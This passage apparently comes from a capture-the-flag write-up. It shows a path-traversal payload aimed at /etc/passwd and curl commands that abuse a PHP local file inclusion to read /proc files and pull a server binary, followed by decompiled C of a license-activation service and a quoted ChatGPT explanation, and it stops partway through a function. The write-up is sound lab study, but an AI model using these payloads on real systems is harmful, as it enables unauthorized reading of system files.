+<p>Final Payload: <code>a.....///.....///.....///.....///.....///etc/passwd</code></p>
+</li>
+<li>
+<p><em>activate_license.php</em>:</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e"># activate_license.php
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_FILES[<span style="color:#e6db74">&#39;licensefile&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    $license      <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>($_FILES[<span style="color:#e6db74">&#39;licensefile&#39;</span>][<span style="color:#e6db74">&#39;tmp_name&#39;</span>]);
+</span></span><span style="display:flex;"><span>    $license_size <span style="color:#f92672">=</span> $_FILES[<span style="color:#e6db74">&#39;licensefile&#39;</span>][<span style="color:#e6db74">&#39;size&#39;</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    $socket <span style="color:#f92672">=</span> <span style="color:#a6e22e">socket_create</span>(<span style="color:#a6e22e">AF_INET</span>, <span style="color:#a6e22e">SOCK_STREAM</span>, <span style="color:#a6e22e">SOL_TCP</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$socket) { <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;error socket_create()</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>; }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">socket_connect</span>($socket, <span style="color:#e6db74">&#39;127.0.0.1&#39;</span>, <span style="color:#ae81ff">1337</span>)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;error socket_connect()&#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">socket_strerror</span>(<span style="color:#a6e22e">socket_last_error</span>()) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">socket_write</span>($socket, <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;N&#34;</span>, $license_size));
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">socket_write</span>($socket, $license);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">socket_shutdown</span>($socket);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">socket_close</span>($socket);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><ul>
+<li>By analyzing the <em>activate_license.php</em> code. We can conclude that the submited file will be sent to a local process listning on port <code>1337</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e"># socket object created
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">socket_connect</span>($socket, <span style="color:#e6db74">&#39;127.0.0.1&#39;</span>, <span style="color:#ae81ff">1337</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># send the file size
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">socket_write</span>($socket, <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;N&#34;</span>, $license_size));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># send the file content
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">socket_write</span>($socket, $license);
+</span></span></code></pre></div><ul>
+<li>To get the process listning on port <code>1337</code>. We wil use a simple trick: we will request the following special file on linux: <code>/proc/sched_debug</code></li>
+<li><code>/proc/sched_debug</code> : This special file contains a list of process running on the system</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~
+</span></span><span style="display:flex;"><span>❯ curl http://10.10.11.154/index.php<span style="color:#ae81ff">\?</span>page<span style="color:#ae81ff">\=</span>php://filter/resource<span style="color:#ae81ff">\=</span>/proc/sched_debug
+</span></span><span style="display:flex;"><span>Sched Debug Version: v0.11, 5.10.0-11-amd64 <span style="color:#75715e">#1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>......
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>runnable tasks:
+</span></span><span style="display:flex;"><span> S            task   PID         tree-key  switches  prio     wait-time             sum-exec        sum-sleep
+</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------------------------------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>........
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>S activate_licens   <span style="color:#ae81ff">411</span>     15071.602333         <span style="color:#ae81ff">9</span>   <span style="color:#ae81ff">120</span>         0.000000         1.852602         0.000000 <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> /
+</span></span><span style="display:flex;"><span> S            cron   <span style="color:#ae81ff">412</span>     35611.351366       <span style="color:#ae81ff">276</span>   <span style="color:#ae81ff">120</span>         0.000000        52.059113         0.000000 <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> /
+</span></span><span style="display:flex;"><span> S        rsyslogd   <span style="color:#ae81ff">418</span>     35157.743823        <span style="color:#ae81ff">51</span>   <span style="color:#ae81ff">120</span>         0.000000         3.971595         0.000000 <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> /
+</span></span><span style="display:flex;"><span> S       in:imklog   <span style="color:#ae81ff">427</span>     33342.408519        <span style="color:#ae81ff">11</span>   <span style="color:#ae81ff">120</span>         0.000000         1.892979         0.000000 <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> /
+</span></span><span style="display:flex;"><span> S   rs:main Q:Reg   <span style="color:#ae81ff">429</span>     35611.332270      <span style="color:#ae81ff">3333</span>   <span style="color:#ae81ff">120</span>         0.000000        92.945178         0.000000 <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> /
+</span></span><span style="display:flex;"><span> S          hwmon1   <span style="color:#ae81ff">508</span>      3588.766100         <span style="color:#ae81ff">2</span>   <span style="color:#ae81ff">120</span>         0.000000         0.018254         0.000000 <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> /
+</span></span><span style="display:flex;"><span> S          agetty   <span style="color:#ae81ff">577</span>      8758.342870         <span style="color:#ae81ff">9</span>   <span style="color:#ae81ff">120</span>         0.000000         4.459420         0.000000 <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> /
+</span></span><span style="display:flex;"><span> S            sshd   <span style="color:#ae81ff">579</span>     11203.112158        <span style="color:#ae81ff">44</span>   <span style="color:#ae81ff">120</span>         0.000000        18.451294         0.000000 <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> /
+</span></span><span style="display:flex;"><span> S           nginx   <span style="color:#ae81ff">581</span>     35622.723457       <span style="color:#ae81ff">211</span>   <span style="color:#ae81ff">120</span>         0.000000        38.343570         0.000000 <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> /
+</span></span><span style="display:flex;"><span> S           nginx   <span style="color:#ae81ff">582</span>     31556.512427        <span style="color:#ae81ff">15</span>   <span style="color:#ae81ff">120</span>         0.000000         3.710789         0.000000 <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> /
+</span></span><span style="display:flex;"><span> S      php-fpm7.4   <span style="color:#ae81ff">583</span>     35342.638077        <span style="color:#ae81ff">59</span>   <span style="color:#ae81ff">120</span>         0.000000        12.122552         0.000000 <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> /
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>........
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># From this process name it&#39;s clear that this is the process used for activate license</span>
+</span></span><span style="display:flex;"><span> S activate_licens   <span style="color:#ae81ff">411</span>     15071.602333         <span style="color:#ae81ff">9</span>   <span style="color:#ae81ff">120</span>         0.000000         1.852602         0.000000 <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> /
+</span></span></code></pre></div><ul>
+<li>We will download the process binary and command line arguments using the following files <a href="https://tldp.org/LDP/Linux-Filesystem-Hierarchy/html/proc.html">reference</a>:
+<ul>
+<li><code>/proc/411/cmdline</code>: Command line arguments.</li>
+<li><code>/proc/411/exe</code>: Link to the executable of this process.</li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~
+</span></span><span style="display:flex;"><span>❯ curl <span style="color:#e6db74">&#34;http://10.10.11.154/index.php?page=php://filter/resource=/proc/411/cmdline&#34;</span> -o cmdline_activate
+</span></span><span style="display:flex;"><span>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+</span></span><span style="display:flex;"><span>                                 Dload  Upload   Total   Spent    Left  Speed
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">100</span>    <span style="color:#ae81ff">31</span>    <span style="color:#ae81ff">0</span>    <span style="color:#ae81ff">31</span>    <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>    <span style="color:#ae81ff">187</span>      <span style="color:#ae81ff">0</span> --:--:-- --:--:-- --:--:--   <span style="color:#ae81ff">189</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>~
+</span></span><span style="display:flex;"><span>❯ curl <span style="color:#e6db74">&#34;http://10.10.11.154/index.php?page=php://filter/resource=/proc/411/exe&#34;</span> -o activate_licens
+</span></span><span style="display:flex;"><span>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+</span></span><span style="display:flex;"><span>                                 Dload  Upload   Total   Spent    Left  Speed
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">100</span> <span style="color:#ae81ff">22536</span>    <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">22536</span>    <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">96500</span>      <span style="color:#ae81ff">0</span> --:--:-- --:--:-- --:--:-- <span style="color:#ae81ff">96721</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>~
+</span></span><span style="display:flex;"><span>❯ ls -alh activate_licens cmdline_activate
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> xh41 xh41 23K Dec  <span style="color:#ae81ff">8</span> 01:26 activate_licens
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> xh41 xh41  <span style="color:#ae81ff">31</span> Dec  <span style="color:#ae81ff">8</span> 01:26 cmdline_activate
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~
+</span></span><span style="display:flex;"><span>❯ cat cmdline_activate
+</span></span><span style="display:flex;"><span>/usr/bin/activate_license <span style="color:#ae81ff">1337</span> <span style="color:#75715e"># the port used by</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~
+</span></span><span style="display:flex;"><span>❯ file activate_licens
+</span></span><span style="display:flex;"><span>activate_licens: ELF 64-bit LSB pie executable, x86-64, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID<span style="color:#f92672">[</span>sha1<span style="color:#f92672">]=</span>554631debe5b40be0f96cabea315eedd2439fb81, <span style="color:#66d9ef">for</span> GNU/Linux 3.2.0, with debug_info, not stripped
+</span></span></code></pre></div><h4 id="start-the-fun-reversing-activate_licens-binary-file">Start the fun: reversing <code>activate_licens</code> binary file</h4>
+<ul>
+<li>Fire up ghidra or IDA: and let&rsquo;s go:</li>
+<li>Main function: Pseudo-code</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e"># main function
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> __noreturn <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>v3; <span style="color:#75715e">// rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v4; <span style="color:#75715e">// rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>v5; <span style="color:#75715e">// rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v6; <span style="color:#75715e">// rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>v7; <span style="color:#75715e">// rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v8; <span style="color:#75715e">// rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>v9; <span style="color:#75715e">// rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v10; <span style="color:#75715e">// rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> clientaddr_s[<span style="color:#ae81ff">16</span>]; <span style="color:#75715e">// [rsp+10h] [rbp-50h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  sockaddr_in clientaddr; <span style="color:#75715e">// [rsp+20h] [rbp-40h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  socklen_t clientaddrlen; <span style="color:#75715e">// [rsp+3Ch] [rbp-24h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  sockaddr_in server; <span style="color:#75715e">// [rsp+40h] [rbp-20h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">uint16_t</span> port; <span style="color:#75715e">// [rsp+56h] [rbp-Ah] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> clientfd; <span style="color:#75715e">// [rsp+58h] [rbp-8h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> serverfd; <span style="color:#75715e">// [rsp+5Ch] [rbp-4h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( argc <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span> )
+</span></span><span style="display:flex;"><span>    error(<span style="color:#e6db74">&#34;specify port to bind to&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)__isoc99_sscanf(argv[<span style="color:#ae81ff">1</span>], <span style="color:#e6db74">&#34;%hu&#34;</span>, <span style="color:#f92672">&amp;</span>port) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    v3 <span style="color:#f92672">=</span> __errno_location();
+</span></span><span style="display:flex;"><span>    v4 <span style="color:#f92672">=</span> strerror(<span style="color:#f92672">*</span>v3);
+</span></span><span style="display:flex;"><span>    error(v4);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;[+] starting server listening on port %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, port);
+</span></span><span style="display:flex;"><span>  server.sin_family <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>;
+</span></span><span style="display:flex;"><span>  server.sin_addr.s_addr <span style="color:#f92672">=</span> htonl(<span style="color:#ae81ff">0x7F000001u</span>);
+</span></span><span style="display:flex;"><span>  server.sin_port <span style="color:#f92672">=</span> htons(port);
+</span></span><span style="display:flex;"><span>  serverfd <span style="color:#f92672">=</span> socket(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">6</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( serverfd <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    v5 <span style="color:#f92672">=</span> __errno_location();
+</span></span><span style="display:flex;"><span>    v6 <span style="color:#f92672">=</span> strerror(<span style="color:#f92672">*</span>v5);
+</span></span><span style="display:flex;"><span>    error(v6);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( bind(serverfd, (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> sockaddr <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>server, <span style="color:#ae81ff">0x10u</span>) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    v7 <span style="color:#f92672">=</span> __errno_location();
+</span></span><span style="display:flex;"><span>    v8 <span style="color:#f92672">=</span> strerror(<span style="color:#f92672">*</span>v7);
+</span></span><span style="display:flex;"><span>    error(v8);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( listen(serverfd, <span style="color:#ae81ff">100</span>) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    v9 <span style="color:#f92672">=</span> __errno_location();
+</span></span><span style="display:flex;"><span>    v10 <span style="color:#f92672">=</span> strerror(<span style="color:#f92672">*</span>v9);
+</span></span><span style="display:flex;"><span>    error(v10);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;[+] listening ...&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      clientfd <span style="color:#f92672">=</span> accept(serverfd, (<span style="color:#66d9ef">struct</span> sockaddr <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>clientaddr, <span style="color:#f92672">&amp;</span>clientaddrlen);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( clientfd <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>      fwrite(<span style="color:#e6db74">&#34;Error: accepting client</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">1uLL</span>, <span style="color:#ae81ff">0x18uLL</span>, stderr);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    inet_ntop(<span style="color:#ae81ff">2</span>, <span style="color:#f92672">&amp;</span>clientaddr.sin_addr, clientaddr_s, <span style="color:#ae81ff">0x10u</span>);
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;[+] accepted client connection from %s:%d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, clientaddr_s, clientaddr.sin_port);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>fork() )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      close(serverfd);
+</span></span><span style="display:flex;"><span>      activate_license(clientfd);
+</span></span><span style="display:flex;"><span>      exit(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    __sysv_signal(<span style="color:#ae81ff">17</span>, (__sighandler_t)((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>dword_0 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>));
+</span></span><span style="display:flex;"><span>    close(clientfd);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><ul>
+<li>chatGPT Explanation: (Very accurate :P)</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-md" data-lang="md"><span style="display:flex;"><span>This code is a simple implementation of a server that listens for incoming client connections on a specified port, accepts them, and then passes the client connection to a function called <span style="color:#e6db74">`activate_license`</span>. The server uses the <span style="color:#e6db74">`inet_ntop`</span> and <span style="color:#e6db74">`fork`</span> functions to handle multiple client connections concurrently.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">`__cdecl`</span> and <span style="color:#e6db74">`__noreturn`</span> are calling conventions and function attributes. <span style="color:#e6db74">`__cdecl`</span> is the standard calling convention for C programs, which specifies the calling and return behavior of functions in the program. <span style="color:#e6db74">`__noreturn`</span> is a function attribute that indicates that the function does not return. In this case, the <span style="color:#e6db74">`main`</span> function is marked with both attributes, indicating that it is a standard C function that does not return.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The <span style="color:#e6db74">`main`</span> function takes three arguments: <span style="color:#e6db74">`argc`</span>, <span style="color:#e6db74">`argv`</span>, and <span style="color:#e6db74">`envp`</span>. <span style="color:#e6db74">`argc`</span> is the number of arguments passed to the program, and <span style="color:#e6db74">`argv`</span> is an array of strings containing the actual arguments. <span style="color:#e6db74">`envp`</span> is an array of strings containing the environment variables of the program.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Inside the <span style="color:#e6db74">`main`</span> function, the code first checks if the number of arguments passed to the program (`argc`) is equal to 2. If not, it calls the <span style="color:#e6db74">`error`</span> function with the string &#34;specify port to bind to&#34;. This means that the program expects the user to specify a port number as an argument when running the program.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Next, the code uses <span style="color:#e6db74">`__isoc99_sscanf`</span> to parse the first argument (the port number) and store it in the <span style="color:#e6db74">`port`</span> variable. If an error occurs, the code gets the error code using <span style="color:#e6db74">`__errno_location`</span> and then calls the <span style="color:#e6db74">`error`</span> function with a string containing a description of the error.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The code then prints a message indicating that the server is starting and listening on the specified port. It creates a <span style="color:#e6db74">`serverfd`</span> socket using the <span style="color:#e6db74">`socket`</span> function, and then uses the <span style="color:#e6db74">`bind`</span> and <span style="color:#e6db74">`listen`</span> functions to bind the socket to the specified port and listen for incoming connections.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Next, the code enters an infinite loop to continuously accept incoming client connections. For each incoming connection, the code calls the <span style="color:#e6db74">`accept`</span> function to accept the connection and store the client information in the <span style="color:#e6db74">`clientaddr`</span> structure. It then calls the <span style="color:#e6db74">`inet_ntop`</span> function to convert the client&#39;s IP address to a human-readable string and print it, along with the client&#39;s port number.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The code then creates a child process using the <span style="color:#e6db74">`fork`</span> function to handle the client connection concurrently with other connections. In the child process, the code calls the <span style="color:#e6db74">`activate_license`</span> function with the client&#39;s socket file descriptor, <span style="color:#e6db74">`clientfd`</span>, and then exits. In the parent process, the code closes the client&#39;s socket file descriptor and continues to accept incoming connections.
+</span></span></code></pre></div><ul>
+<li><em>activate_license</em> function analysis:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">activate_license</span>(<span style="color:#66d9ef">int</span> sockfd)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>v1; <span style="color:#75715e">// rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v2; <span style="color:#75715e">// rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>v3; <span style="color:#75715e">// rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v4; <span style="color:#75715e">// rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v5; <span style="color:#75715e">// rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v6; <span style="color:#75715e">// rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v7; <span style="color:#75715e">// rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v8; <span style="color:#75715e">// rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v9; <span style="color:#75715e">// rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v10; <span style="color:#75715e">// rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v11; <span style="color:#75715e">// rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v12; <span style="color:#75715e">// rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  sqlite3_stmt_0 <span style="color:#f92672">*</span>stmt; <span style="color:#75715e">// [rsp+18h] [rbp-218h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  sqlite3_0 <span style="color:#f92672">*</span>db; <span style="color:#75715e">// [rsp+20h] [rbp-210h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">uint32_t</span> msglen; <span style="color:#75715e">// [rsp+2Ch] [rbp-204h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">512</span>]; <span style="color:#75715e">// [rsp+30h] [rbp-200h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( read(sockfd, <span style="color:#f92672">&amp;</span>msglen, <span style="color:#ae81ff">4uLL</span>) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    v1 <span style="color:#f92672">=</span> __errno_location();
